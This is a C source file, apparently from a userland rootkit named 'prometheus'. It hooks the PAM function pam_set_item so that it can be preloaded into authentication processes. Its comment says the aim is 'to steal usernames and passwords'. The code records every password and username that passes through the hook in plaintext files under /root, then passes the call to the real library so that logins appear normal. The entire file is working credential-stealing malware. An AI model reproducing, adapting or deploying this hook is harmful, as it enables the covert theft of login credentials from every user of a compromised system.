#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

#include <security/pam_appl.h>
#include <security/pam_modules.h>

#include "prometheus.h"

/*
 * Append a message to a file (Create it if it doesn't exist)
 */
void logmsg(char *file, char *msg) {
	FILE *f = fopen(file, "a+");    // Open the file in append mode
	if (f == NULL) {                // If something went wrong, return
		return;
	}
	fprintf(f, "%s\n", msg);        // Write the message to the file
	fclose(f);                      // Close the file
}

/*
 * Initialization function
 *
 * Used to build the structure with the 
 * real function pointer of the hooked function.
 * This is called at the beginning of every hooked function
 */
void init(void) {
	char *scall = "pam_set_item";
	struct_pam_auth.pam_func = dlsym(RTLD_NEXT, scall);     // Get function pointer
                                                                // for function in next library
                                                                // i.e. not our .so, but libpam.so
}

/*
 * Hook the pam_set_item function in order to steal usernames and passwords
 */
int pam_set_item (pam_handle_t *pamh, int item_type, const void *item) {
	init();                         // Call initialization function
	char* pass = (char *)item;      // Capture the password
	
	if(item_type == PAM_AUTHTOK) {                  //If it's an AUTHTOK and not null
		if(item != NULL) {
			logmsg("/root/creds", pass);	// log it to a file
		}
	}
	else if (item_type == PAM_USER) {               //If it's a USER and not null
		if(item != NULL) {
			logmsg("/root/users", pass);	// log it to a file
		}
	}
	
        // Call and return the real function
	return (long)struct_pam_auth.pam_func(pamh, item_type, item);    // Call the real function
}
